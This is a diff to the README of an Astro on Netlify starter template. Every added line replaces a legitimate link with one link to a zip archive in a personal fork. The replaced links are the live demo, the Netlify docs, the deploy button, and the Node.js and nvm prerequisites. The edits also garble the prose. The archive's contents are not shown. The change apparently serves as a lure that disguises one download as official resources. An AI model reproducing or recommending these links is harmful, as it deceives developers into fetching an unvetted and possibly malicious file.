@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://astro-platform-starter.netlify.app/)
+[Live Demo](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip)
 
-A modern starter based on Astro.js, Tailwind, daisyUI, and [Netlify Core Primitives](https://docs.netlify.com/core/overview/#develop) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip, Tailwind, daisyUI, and [Netlify Core Primitives](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/astro-platform-starter)
+[![Deploy to Netlify](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip)](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip)
 
 ## Developing Locally
 
 | Prerequisites             |
 | :------------------------ |
-| [Node.js](https://nodejs.org/) v18.14+. |
-| (optional) [nvm](https://github.com/nvm-sh/nvm) for Node version management. |
+| [https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip) v18.14+. |
+| (optional) [nvm](https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -42,7 +42,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the Astro.js development server via Netlify CLI:
+4. Then, run the https://github.com/krisp000/astro-platform-starter/raw/refs/heads/main/src/pages/astro-platform-starter-1.0.zip development server via Netlify CLI:
 
 ```
 netlify dev
